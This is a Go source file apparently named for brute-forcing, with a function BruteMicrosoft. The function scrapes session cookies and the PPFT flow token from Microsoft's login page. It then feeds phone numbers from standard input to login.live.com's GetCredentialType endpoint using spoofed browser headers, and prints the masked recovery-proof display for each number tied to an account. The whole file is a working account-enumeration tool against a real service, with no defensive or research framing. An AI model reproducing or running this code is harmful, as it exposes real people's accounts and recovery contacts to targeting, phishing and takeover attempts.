package bruteforceSite

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

type ResponseDataMStruct struct {
	IfExistsResult int `json:"IfExistsResult"`
	Credentials    struct {
		OtcLoginEligibleProofs []struct {
			Data        string `json:"data"`
			ClearDigits string `json:"clearDigits"`
			Display     string `json:"display"`
		} `json:"OtcLoginEligibleProofs"`
	} `json:"Credentials"`
}

func BruteMicrosoft() {
	var flowToken string
	var Cookie string
	var uaid string
	numberphones := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		numberphones = append(numberphones, strings.Replace(scanner.Text(), "+", "", -1))
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	req, err := http.NewRequest("GET", "https://login.live.com/login.srf", bytes.NewBuffer([]byte(``)))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Referer", "https://www.microsoft.com/")
	req.Header.Set("Dnt", "1")
	req.Header.Set("Sec-Gpc", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Te", "trailers")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	for _, ck := range resp.Cookies() {
		Cookie += ck.Name + "=" + ck.Value + ";"
		if ck.Name == "uaid" {
			uaid = ck.Value
		}
	}
	gz, err := gzip.NewReader(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	defer gz.Close()
	body, err := ioutil.ReadAll(gz)
	if err != nil {
		log.Fatal(err)
	}
	re := regexp.MustCompile(`name="PPFT".*value="([^"]*)"`)
	match := re.FindStringSubmatch(string(body))

	if len(match) > 0 {
		flowToken = match[1]
	} else {
		log.Fatalln("Nenhum valor 'PPFT' encontrado")
	}

	for _, numberphone := range numberphones {
		data := []byte(`{"username":"` + numberphone + `","uaid":"` + uaid + `","isOtherIdpSupported":false,"checkPhones":true,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"forceotclogin":false,"otclogindisallowed":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":3,"isSignup":false,"flowToken":"` + flowToken + `"}`)
		req, err := http.NewRequest("POST", "https://login.live.com/GetCredentialType.srf", bytes.NewBuffer(data))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Cookie", Cookie)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Referer", "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=19&ct=1702937427&rver=7.3.6960.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2frpsauth%2fv1%2faccount%2fSignInCallback%3fstate%3deyJSdSI6Imh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vcHQtYnIiLCJMYyI6IjEwNDYiLCJIb3N0Ijoid3d3Lm1pY3Jvc29mdC5jb20ifQ&lc=1046&id=74335&aadredir=0")
		req.Header.Set("Content-Type", "application/json; charset=utf-8")
		req.Header.Set("Origin", "https://login.live.com")
		req.Header.Set("Dnt", "1")
		req.Header.Set("Sec-Gpc", "1")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-site")
		req.Header.Set("Te", "trailers")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			log.Fatalln("Response server:", resp.StatusCode)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		var ResponseData ResponseDataMStruct
		err = json.Unmarshal(body, &ResponseData)
		if err != nil {
			fmt.Printf("Erro ao desempacotar o JSON: %v\n", err)
			return
		}
		if ResponseData.IfExistsResult == 0 {
			if len(ResponseData.Credentials.OtcLoginEligibleProofs) > 0 {
				if len(ResponseData.Credentials.OtcLoginEligibleProofs[0].Display) > 0 {
					fmt.Println("\033[32m[+] " + numberphone + " => " + ResponseData.Credentials.OtcLoginEligibleProofs[0].Display + "\033[0m")
				}
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
}
